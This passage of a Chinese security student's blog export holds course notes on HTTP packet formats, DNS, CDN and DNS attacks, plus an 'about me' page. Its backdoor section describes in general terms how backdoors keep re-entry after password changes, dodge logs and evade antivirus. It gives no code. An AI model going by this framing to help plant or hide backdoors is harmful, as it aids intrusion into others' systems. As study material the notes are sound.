href="http://hostname:8080/icconcept/index.jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%B7%9F%E8%B8%AA">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪</a> Web 请求是从什么网站来的。  </li><li>Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。  </li><li>Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.  </li><li>Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</li></ul></li></ol><h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><ul><li>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</li></ul><h3 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h3><ul><li>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /zb_system/cmd.php?act=search HTTP/1.1 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 </span><br><span class="line">Cache-Control: max-age=0 </span><br><span class="line">Connection: keep-alive </span><br><span class="line">Content-Length: 3 </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Cookie: ZDEDebuggerPresent=php,phtml,php3 </span><br><span class="line">Host: www.xiaodi8.com </span><br><span class="line">Origin: http://xiaodi8.com </span><br><span class="line">Referer: http://xiaodi8.com/ </span><br><span class="line">Upgrade-Insecure-Requests: 1 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62</span><br><span class="line"></span><br><span class="line">q=1</span><br></pre></td></tr></table></figure></li></ul><h2 id="Response返回数据包数据格式"><a href="#Response返回数据包数据格式" class="headerlink" title="Response返回数据包数据格式"></a>Response返回数据包数据格式</h2><ul><li>一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</li></ul><ol><li>状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔  </li><li>响应头标：包含服务器类型、日期、长度、内容类型等  </li><li>空行：响应头与响应体之间用空行隔开  </li><li>响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Response Header</span><br><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Date: Tue, 29 Aug 2023 07:57:46 GMT </span><br><span class="line">Server: Apache/2.4.46 (Win32) OpenSSL/1.1.1g mod_fcgid/2.3.9a </span><br><span class="line">X-Powered-By: PHP/5.4.45 </span><br><span class="line">Product: Z-BlogPHP 1.6.6 Valyria </span><br><span class="line">X-XSS-Protection: 1; mode=block </span><br><span class="line">Set-Cookie: ZDEDebuggerPresent=php,phtml,php3; path=/ </span><br><span class="line">Upgrade: h2,h2c </span><br><span class="line">Connection: Upgrade, Keep-Alive </span><br><span class="line">Vary: Accept-Encoding </span><br><span class="line">Content-Encoding: gzip </span><br><span class="line">Content-Length: 3157 </span><br><span class="line">Keep-Alive: timeout=5, max=100 </span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure></li></ol><ul><li>响应数据<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20160122.png" alt="响应数据"></li></ul><h3 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h3><pre><code>1xx：信息，请求收到，继续处理  2xx：成功，行为被成功地接受、理解和采纳  3xx：重定向，为了完成请求，必须进一步执行的动作  4xx：客户端错误  5xx：服务器错误-200 存在文件403 存在文件夹3xx 均可能存在404 不存在文件及文件夹500 均可能存在</code></pre><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%201609461.png" alt="响应码"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20161415.png"></p><hr><p>笔记内容参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a>、<a href="https://mp.weixin.qq.com/s/hF0sNnZbqnNfSqzZlzYsmA">0x00实验室</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day01基础入门-概念名词</title>
      <link href="/2023/08/28/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/"/>
      <url>/2023/08/28/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="概念名词"><a href="#概念名词" class="headerlink" title="概念名词"></a>概念名词</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><h3 id="什么是域名"><a href="#什么是域名" class="headerlink" title="什么是域名"></a>什么是域名</h3><p>相当于网站的名字维基百科对域名的解释是：互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。<br>网域名称系统（Domain Name System）有时也简称为域名（DNS），是互联网的一项核心服务，它作为可以将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网，而不用去记住能够被机器直接读取的 IP 地址数据串。</p><h3 id="域名在哪里注册？"><a href="#域名在哪里注册？" class="headerlink" title="域名在哪里注册？"></a>域名在哪里注册？</h3><ol><li>Godaddy</li><li>Gandi</li><li>Hover</li><li>Namesilo</li><li>Namecheap</li><li>万网</li></ol><h3 id="什么是二级域名多级域名？"><a href="#什么是二级域名多级域名？" class="headerlink" title="什么是二级域名多级域名？"></a>什么是二级域名多级域名？</h3><ol><li>顶级域名:又叫一级域名,一串字符串中间一个点隔开,例如 baidu.com。顶级域名是互联网DNS等级之中的最高级的域,它保存于DNS根域的名字空间中。</li><li>二级域名:实际上就是一个一级域名以下的主机名,一串字符串中间两个“.”隔开,例如 <a href="http://www.baidu.com/">www.baidu.com</a> 。二级域名就是最靠近顶级域名左侧的字段。</li><li>三级域名:二级域名的子域名,特征是包含三个“.”,例如___.___.baidu.com…</li></ol><h3 id="域名发现对于安全测试意义？"><a href="#域名发现对于安全测试意义？" class="headerlink" title="域名发现对于安全测试意义？"></a>域名发现对于安全测试意义？</h3><p>进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="什么是DNS？"><a href="#什么是DNS？" class="headerlink" title="什么是DNS？"></a>什么是DNS？</h3><p>域名系统(Domain Name System,DNS)是Internet上解决网上机器命名的一种系统。 就像拜访朋友要先知道别人家怎么走一样，Internet上当一台主机要访问另外一台主机时，必须首先获知其地址，TCP&#x2F;IP中的IP地址是由四段以“.”分开的数字组成(此处以IPv4的地址为例，IPv6的地址同理)，记起来总是不如名字那么方便，所以，就采用了域名系统来管理名字和IP的对应关系。</p><h3 id="本地Hosts与DNS的关系"><a href="#本地Hosts与DNS的关系" class="headerlink" title="本地Hosts与DNS的关系"></a>本地Hosts与DNS的关系</h3><ol><li>Hosts文件主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。</li><li>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</li><li>浏览器访问网站，要首先通过DNS服务器把要访问的网站域名解析成一个唯一的IP地址，之后，浏览器才能对此网站进行定位并且访问其数据。<br><strong>如何查看本地Hosts文件：</strong></li><li><code>Win</code> + <code>R</code>：打开运行输入<code>drivers</code></li><li>输入：<code>c:\windows\system32\drivers\etc</code></li><li>选择使用<code>记事本</code>或者<code>Notepad</code>、<code>Vs Code</code> 等编程软件打开<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20143352.png" alt="截图"></li></ol><h3 id="CDN是什么？与DNS的关系？"><a href="#CDN是什么？与DNS的关系？" class="headerlink" title="CDN是什么？与DNS的关系？"></a>CDN是什么？与DNS的关系？</h3><ol><li>CDN的全称是Content DeliveryNetwork，即内容分发网络。</li><li>CDN的基本思路：是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。</li><li>通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上（单纯只使用DNS解析，直接PING就会显示出自己的真实IP,如果又使用CDN，PING出来的IP就不是用户的真实IP而是CDN服务器的IP节点。需要绕过CDN后去找真实IP地址。</li><li>使用CDN的目的：是使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。<br>通过超级ping的网站可以看到CDN的解析情况<a href="https://www.ping.cn/ping/cdivtc.com">https://www.ping.cn/ping/cdivtc.com</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20144311.png" alt="截图"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20144614.png" alt="截图"></li></ol><h3 id="常见的DNS安全攻击有哪些？"><a href="#常见的DNS安全攻击有哪些？" class="headerlink" title="常见的DNS安全攻击有哪些？"></a>常见的DNS安全攻击有哪些？</h3><h4 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h4><p>DDoS攻击也叫做分布式拒绝服务攻击，可以使很多的计算机在同一时间遭受到攻击，使攻击的目标无法正常使用。攻击者可以伪造自己的DNS服务器地址，同时发送大量请求给其他服务器。其他服务器的回复会被发送到被伪造服务器的真实地址，造成该服务器无法处理请求而崩溃。攻击者同样可以通过利用DNS协议中存在的漏洞，恶意创造一个载荷过大的请求，造成目标DNS服务器崩溃。</p><h4 id="DNS缓存中毒"><a href="#DNS缓存中毒" class="headerlink" title="DNS缓存中毒"></a>DNS缓存中毒</h4><p>DNS缓存中毒攻击者给DNS服务器注入非法网络域名地址，如果服务器接受这个非法地址，那说明其缓存就被攻击了，而且以后响应的域名请求将会受黑客所控。当这些非法地址进入服务器缓存，用户的浏览器或者邮件服务器就会自动跳转到DNS指定的地址。这种攻击往往被归类为域欺骗攻击(pharming attack)，由此它会导致出现很多严重问题。首先，用户往往会以为登陆的是自己熟悉的网站，而它们却并不是。与钓鱼攻击采用非法URL不同的是，这种攻击使用的是合法的URL地址。</p><h4 id="域名劫持（DNS重定向）"><a href="#域名劫持（DNS重定向）" class="headerlink" title="域名劫持（DNS重定向）"></a>域名劫持（DNS重定向）</h4><p>域名劫持是通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的地址从而实现用户无法访问目标网站的目的。域名劫持一方面可能影响用户的上网体验，用户被引到假冒的网站进而无法正常浏览网页，而用户量较大的网站域名被劫持后恶劣影响会不断扩大；另一方面用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</p><h4 id="DNS查询嗅探"><a href="#DNS查询嗅探" class="headerlink" title="DNS查询嗅探"></a>DNS查询嗅探</h4><ol><li>攻击者主要利用对DNS的配置信息获取网络环境的信息，为之后的攻击做好的准备。</li><li>针对这些情况，我们需要对DNS服务器需要采取特别的安全保护措施，在防火墙网络中，分开设置内部DNS服务器和外部DNS服务器，连接外部服务的外部DNS服务器上不留有对外禁止访问的内部网络系统的服务器，做到内外网络服务器分割。</li></ol><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><ol><li>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。ARP攻击主要是存在于局域网网络中，局域网中若有一台计算机感染ARP病毒，则感染该ARP病毒的系统将会试图通过”ARP欺骗”手段截获所在网络内其它计算机的通信信息，并因此造成网内其它计算机的通信故障。</li><li>ARP欺骗通常是在用户局网中，造成用户访问域名的错误指向。如果IDC机房也被ARP病毒入侵后，则也可能出现攻击者采用ARP包压制正常主机、或者压制DNS服务器，以使访问导向错误指向的情况。</li></ol><h4 id="本机劫持"><a href="#本机劫持" class="headerlink" title="本机劫持"></a>本机劫持</h4><p>本机的计算机系统被木马或流氓软件感染后，也可能会出现部分域名的访问异常。</p><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><h3 id="常见脚本语言"><a href="#常见脚本语言" class="headerlink" title="常见脚本语言"></a>常见脚本语言</h3><ol><li>一种介乎于 <code>HTML</code> 和诸如 <code>Java</code> 、 <code>Visual Basic</code> 、 <code>C++</code>等编程语言之间的一种特殊的语言。</li><li>尽管它更接近后者，但它却不具有编程语言复杂、严谨的语法和规则。</li><li>常见的脚本语言有：<code>Python</code>、<code>JavaScript</code>、<code>Asp</code> (逐渐淘汰，基本都是小站点在使用)、<code>Aspx</code>、<code>PHP</code> （目前比较流行）<code>javaweb</code>、 <code>pl</code>、<code>cgi</code>等</li></ol><h3 id="不同脚本类型与安全漏洞的关系"><a href="#不同脚本类型与安全漏洞的关系" class="headerlink" title="不同脚本类型与安全漏洞的关系"></a>不同脚本类型与安全漏洞的关系</h3><ul><li>不同的脚本语言的编写规则不一样，程序产生的漏洞自然也不一样（代码审计）。</li></ul><h3 id="漏洞挖掘代码审计与脚本类型的关系"><a href="#漏洞挖掘代码审计与脚本类型的关系" class="headerlink" title="漏洞挖掘代码审计与脚本类型的关系"></a>漏洞挖掘代码审计与脚本类型的关系</h3><ul><li>漏洞挖掘代码审计：要熟悉相关代码和相关逻辑机制</li></ul><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><h3 id="什么是后门？有那些后门？"><a href="#什么是后门？有那些后门？" class="headerlink" title="什么是后门？有那些后门？"></a>什么是后门？有那些后门？</h3><ol><li>在信息安全领域，后门是指绕过安全控制而获取对程序或系统访问权的方法。</li><li>后门的最主要目的就是方便以后再次秘密进入或者控制系统。</li></ol><h3 id="后门的分类"><a href="#后门的分类" class="headerlink" title="后门的分类"></a>后门的分类</h3><ol><li><p>网页后门 ：<br> 此类后门程序一般都是服务器上正常 的web服务来构造自己的连接方式，比如现在非常流行的ASP、cgi脚本后门等。</p></li><li><p>线程插入后门：<br> 利用系统自身的某个服务或者线程，将后门程序插入到其中，具体原理原来《黑客防线》曾具体讲解过，感兴趣的朋友可以查阅。这也是现在最流行的一个后门技术。</p></li><li><p>扩展后门：<br> 所谓的“扩展”，是指在功能上有大的提升，比普通的单一功能的后门有很强的使用性，这种后门本身就相当于一个小的安全工具包，能实现非常多的常驻见安全功能，适合新手使用————但是，功能越强，个人觉得反而脱郭后门“隐蔽”的初衷，具体看法就看各位使用都的喜好了。</p></li><li><p>C&#x2F;S后门（客户端服务器后门）：<br> 和传统的木马程序类似的控制方法，采用“客记端&#x2F;服务端”的控制方式，通过某种特定的访问方式来启动后门进而控制服务器。</p></li></ol><h3 id="后门在安全测试中的实际意义"><a href="#后门在安全测试中的实际意义" class="headerlink" title="后门在安全测试中的实际意义"></a>后门在安全测试中的实际意义</h3><ol><li>方便下次更方便的进来。</li><li>获取到相关权限之后，后门相当于一个管道，便于操作。</li><li>即使管理员通过改变所有密码之类的方法来提高安全性，仍然能再次侵入，使再次侵入被发现的可能性减至最低。</li><li>大多数后门设法躲过日志，大多数情况下即使入侵者正在使用系统也无法显示他已在线。</li></ol><h3 id="关于后门需要了解那些？-玩法，免杀"><a href="#关于后门需要了解那些？-玩法，免杀" class="headerlink" title="关于后门需要了解那些？(玩法，免杀)"></a>关于后门需要了解那些？(玩法，免杀)</h3><ol><li><p>玩法（创建后门之后我们可以怎么样操作？）<br> 网站后门：便于控制网站<br> 软件后门：用于控制<br> 服务器后门：可以进行脱库、盗取信息</p></li><li><p>免杀技术全称为反杀毒技术Anti Anti-Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。</p></li><li><p>由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。</p></li><li><p>其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</p></li><li><p>后门需要掌握的核心技能，防止杀毒软件检查到</p></li></ol><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web的组成框架模型"><a href="#web的组成框架模型" class="headerlink" title="web的组成框架模型"></a>web的组成框架模型</h3><ul><li>WEB的组成框架模型：网站原码、操作系统、中间件（搭建平台，提供服务的）、数据库。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/web%E7%9A%84%E7%BB%84%E6%88%90%E6%A1%86%E6%9E%B6.png" alt="Web的组成框架"></li></ul><h3 id="架构漏洞安全测试的简要测试"><a href="#架构漏洞安全测试的简要测试" class="headerlink" title="架构漏洞安全测试的简要测试"></a>架构漏洞安全测试的简要测试</h3><ol><li><p>通信层<br> 主要测试通信协议的安全，系统开放的端口，其中操作系统提供网络层和数据链路层协议，存在问题的可能性较小，一般关注开源协议已存在漏洞即可，无需重点关注。应用层服务与协议一般由产品形态决定，产品中可以自定义配置相关协议与参数，需要重点关注与测试。</p></li><li><p>应用层<br> 应用层包含开发人员开发代码，为整个安全测试的核心模块。主要包括web安全测试，源码安全测试。其中web安全测试从web访问服务的维度，偏向黑盒，进行安全测试。源码安全测试从代码的维度，偏向白盒，进行安全测试。</p></li><li><p>系统层<br> 主要测试操作系统安全，数据库服务安全，web服务器安全，以及其他一些中间件的安全。</p></li><li><p>管理层<br> 主要包括产品资料的安全测试，安全策略制定，协调各个层面的安全测试以及安全风险的整体评估。</p></li></ol><h3 id="为什么要从web界面为主"><a href="#为什么要从web界面为主" class="headerlink" title="为什么要从web界面为主"></a>为什么要从web界面为主</h3><p>因为web使用方面广 。从web方向先入手，一步一步的获取最高权限。</p><h2 id="Web相关漏洞"><a href="#Web相关漏洞" class="headerlink" title="Web相关漏洞"></a>Web相关漏洞</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/web%E6%BC%8F%E6%B4%9E.png" alt="Web相关漏洞"></p><h2 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h2><h3 id="多级域名的枚举查找"><a href="#多级域名的枚举查找" class="headerlink" title="多级域名的枚举查找"></a>多级域名的枚举查找</h3><ul><li>layer子域名探测<br>链接：<a href="https://pan.baidu.com/s/1YFu9V0WtdG905eaVFNFa0A">https://pan.baidu.com/s/1YFu9V0WtdG905eaVFNFa0A</a><br>提取码：zkaq<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20201908.png" alt="layer子域名挖掘机"></li></ul><hr><p>笔记内容参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关于我的</title>
      <link href="/2023/08/25/%E6%9C%89%E5%85%B3%E4%BA%8E%E6%88%91%E7%9A%84/"/>
      <url>/2023/08/25/%E6%9C%89%E5%85%B3%E4%BA%8E%E6%88%91%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h1 id="有关于我的"><a href="#有关于我的" class="headerlink" title="有关于我的"></a>有关于我的</h1><hr><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E6%A2%A6%E6%AF%94%E4%BC%98%E6%96%AF.jpg" alt="Alien"></p><blockquote><p><strong>人生格言：永远相信美好的事情即将发生，因为追求源于热爱！</strong></p></blockquote><h1 id="关于Alien"><a href="#关于Alien" class="headerlink" title="关于Alien"></a>关于Alien</h1><p>你好！感谢来到我的博客，很高兴在这介绍我自己！</p><p><strong>我叫 Alien</strong>！</p><p>是一名在校大学生，前端开发者，现在是大三。</p><img class="inline-img" src="https://gimg3.baidu.com/search/src=https%3A%2F%2Fstatic-data.gaokao.cn%2Fupload%2Flogo%2F291.jpg%3Ft%3D1711468815&refer=http%3A%2F%2Fwww.baidu.com&app=2021&size=w931&n=0&g=0n&er=404&q=75&fmt=auto&maxorilen2heic=2000000?sec=1711645200&t=8122c254475946f59cbb646759da7ce8" style="height:75px"/> <img class="inline-img" src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-27%20224016.png" style="height:75px"/> <img class="inline-img" src="https://y.qq.com/mediastyle/yqq/img/logo.png?max_age=2592000" style="height:75px"/> <img class="inline-img" src="https://alien-blog.oss-cn-beijing.aliyuncs.com/ultramanlogo.jpg" style="height:75px"/> <p><strong>就读院校：</strong> 东莞理工学院<br><strong>本科专业：</strong> 网络空间安全<br><strong>MBTI性格：</strong> ISFJ<br><strong>个人爱好：</strong> 听歌、写代码、数码、汽车、看电影、奥特曼、游戏</p><h1 id="细说个人爱好"><a href="#细说个人爱好" class="headerlink" title="细说个人爱好"></a>细说个人爱好</h1><p>喜欢的音乐人主要是周杰伦、林俊杰、陈奕迅、五月天、王力宏、陶喆、孙燕姿、Zard坂井泉水（我女神）、久石让（他的音乐真的很好听）、Radwimps、米津玄师，平时没事就听歌，可以说是个终身爱好了。</p><p>喜欢的电影有幽灵公主（强烈推荐）、哈尔的移动城堡、天空之城。（很不巧，都是宫崎骏的）</p><p>游戏玩的不多，像云顶之弈这种比较多人玩，比较喜欢单机的游戏，比如极限竞速：地平线、塞尔达传说：王国之泪、GTA5。</p><p>应该没有人不喜欢奥特曼吧！（\狗头）</p><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://alien-blog.oss-cn-beijing.aliyuncs.com/zard.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">坂井泉水</div>  <p>一位日本的传奇女摇滚歌手</p>  <a href='https://y.qq.com/n/ryqq/singer/004P4J0D0bAzf3'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://alien-blog.oss-cn-beijing.aliyuncs.com/joehisaishi.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">久石让</div>  <p>宫崎骏电影的配乐大师</p>  <a href='https://y.qq.com/n/ryqq/singer/003GBWij2kV7Tg'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://alien-blog.oss-cn-beijing.aliyuncs.com/horizon5.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">极限竞速：地平线 5</div>  <p>我最喜欢的赛车游戏</p>  <a href='https://forza.net/'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://alien-blog.oss-cn-beijing.aliyuncs.com/94d5-iskepxt9956243.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">幽灵公主</div>  <p>我最喜欢的电影</p>  <a href='https://baike.baidu.com/item/%E5%B9%BD%E7%81%B5%E5%85%AC%E4%B8%BB/30673?fr=ge_ala'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://alien-blog.oss-cn-beijing.aliyuncs.com/37fab84f43a81eaa.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">塞尔达传说：王国之泪</div>  <p>我最喜欢的单机游戏</p>  <a href='https://baike.baidu.com/item/%E5%A1%9E%E5%B0%94%E8%BE%BE%E4%BC%A0%E8%AF%B4%EF%BC%9A%E7%8E%8B%E5%9B%BD%E4%B9%8B%E6%B3%AA/61984963?fr=ge_ala'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://alien-blog.oss-cn-beijing.aliyuncs.com/D16CCD3CEC294E0C2639234E616E68C9.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">奥特曼</div>  <p>应该没有人不喜欢奥特曼吧</p>  <a href='https://m78alien.github.io/pic/ultraman/'></a>  </figcaption>  </figure>  </div><!-- ## 音乐喜欢的音乐人主要是周杰伦、林俊杰、陈奕迅、五月天、王力宏、陶喆、孙燕姿、Zard坂井泉水（我女神）、久石让（他的音乐真的很好听）、Radwimps、米津玄师，平时没事就听歌，可以说是个终身爱好了。 --><h1 id="怎样能够联系到我呢？"><a href="#怎样能够联系到我呢？" class="headerlink" title="怎样能够联系到我呢？"></a>怎样能够联系到我呢？</h1><p>邮箱：<a href="mailto:&#109;&#55;&#56;&#97;&#108;&#x69;&#101;&#110;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;">&#109;&#55;&#56;&#97;&#108;&#x69;&#101;&#110;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;</a><br>Github：<a href="https://github.com/M78Alien">M78Alien</a><br>B站：<a href="https://space.bilibili.com/360390916?spm_id_from=333.1007.0.0">Alien船长大人</a></p><!-- ## 关于 Alien你好！感谢来到我的博客，很高兴在这介绍我自己！**我叫 Alien**！是一名在校大学生，前端开发者，现在是大三。123 -->]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
